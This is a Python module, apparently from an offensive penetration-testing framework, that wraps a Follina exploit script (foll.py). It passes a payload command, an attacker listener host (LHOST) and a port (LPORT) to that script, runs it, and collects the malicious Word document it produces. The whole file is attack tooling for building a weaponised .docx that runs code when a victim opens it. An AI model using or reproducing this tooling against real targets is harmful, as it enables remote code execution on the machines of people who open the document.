"""Foll runner module - runs foll.py as subprocess and copies output to project root"""

import subprocess
import shutil
import os
from pathlib import Path
from typing import Dict, Any
from colorama import Fore, Style
from modules.base import BaseModule

class Follina_Exploit(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "Run foll.py with options and copy produced docx to project root"
        self.module_type = "auxiliary"
        # Keys uppercase to match BaseModule behavior
        self.options = {
            "FOLL_PATH": "./modules/exploits/foll.py",   # path to foll.py (relative to project root or absolute)
            "PYTHON": "python",       # python interpreter to call (path or 'python')
            "PAYLOAD": "",                # value for -c
            "LHOST": "",              # value for -i
            "LPORT": "",              # value for -p
            "OUTPUT": "foll.docx",    # output filename expected from foll.py (just filename recommended)
            "TIMEOUT": "300",         # seconds to wait for process to finish
        }
        self.required_options = ["PAYLOAD", "LHOST", "LPORT"]

    def _sanitize_filename(self, filename: str) -> str:
        # avoid path traversal: take basename only
        return os.path.basename(filename)

    def _resolve_project_root(self) -> Path:
        # assume modules are in <project_root>/modules/...
        # Path(__file__).parents[2] => project_root
        return Path(__file__).resolve().parents[2]

    def run(self) -> Dict[str, Any]:
        ok, msg = self.validate_options()
        if not ok:
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        foll_path_opt = self.get_option("FOLL_PATH") or "foll.py"
        python_bin = self.get_option("PYTHON") or "python"
        pay = str(self.get_option("PAYLOAD"))
        lhost = str(self.get_option("LHOST"))
        lport = str(self.get_option("LPORT"))
        outfile_opt = str(self.get_option("OUTPUT") or "foll.docx")
        try:
            timeout = float(self.get_option("TIMEOUT") or 300)
        except Exception:
            timeout = 300.0

        outfile_name = self._sanitize_filename(outfile_opt)
        project_root = self._resolve_project_root()

        # Resolve foll.py location:
        foll_path = Path(foll_path_opt)
        if not foll_path.is_absolute():
            # try relative to project root first
            cand = project_root.joinpath(foll_path_opt)
            if cand.exists():
                foll_path = cand
            else:
                # fallback: relative to current working dir
                foll_path = Path(foll_path_opt).resolve()

        if not foll_path.exists():
            msg = f"foll.py not found at: {foll_path}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        # Build subprocess argument list (no shell)
        cmd = [
            str(python_bin),
            str(foll_path),
            "-c", pay,
            "-o", outfile_name,
            "-i", lhost,
            "-p", lport
        ]

        print(f"{Fore.YELLOW}[*] Running: {' '.join(cmd)}{Style.RESET_ALL}")
        try:
            completed = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=str(project_root),  # run in project root so relative output lands there
                timeout=timeout,
                text=True
            )
        except subprocess.TimeoutExpired:
            msg = f"Process timed out after {timeout} seconds"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}
        except FileNotFoundError as e:
            msg = f"Interpreter not found: {python_bin} ({e})"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}
        except Exception as e:
            msg = f"Error launching process: {e}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        # Show subprocess output for debugging
        if completed.stdout:
            print(f"{Fore.CYAN}[stdout]{Style.RESET_ALL}\n{completed.stdout}")
        if completed.stderr:
            print(f"{Fore.RED}[stderr]{Style.RESET_ALL}\n{completed.stderr}")

        if completed.returncode != 0:
            msg = f"Process exited with code {completed.returncode}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {
                "success": False,
                "message": msg,
                "returncode": completed.returncode,
                "stdout": completed.stdout,
                "stderr": completed.stderr
            }

        # After successful run, look for output file (in project_root because cwd set)
        produced_file = project_root.joinpath(outfile_name)
        if not produced_file.exists():
            # maybe foll.py wrote to a different path (absolute or relative), try to search current dir
            alt = Path.cwd().joinpath(outfile_name)
            if alt.exists():
                produced_file = alt
            else:
                msg = f"Expected output file not found: {outfile_name}"
                print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
                return {
                    "success": False,
                    "message": msg,
                    "stdout": completed.stdout,
                    "stderr": completed.stderr
                }

        # destination in project root (copy there if not already)
        dest_dir = project_root  # you can change to project_root / "output" if desired
        dest_path = dest_dir.joinpath(outfile_name)
        try:
            # If produced_file is the same as dest_path, nothing to do
            if produced_file.resolve() != dest_path.resolve():
                shutil.copy2(str(produced_file), str(dest_path))
                print(f"{Fore.GREEN}[+] Copied {produced_file} -> {dest_path}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] Output file already at {dest_path}{Style.RESET_ALL}")
        except Exception as e:
            msg = f"Failed to copy output file: {e}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        return {
            "success": True,
            "message": "Process completed and output copied",
            "output_path": str(dest_path),
            "stdout": completed.stdout,
            "stderr": completed.stderr
        }
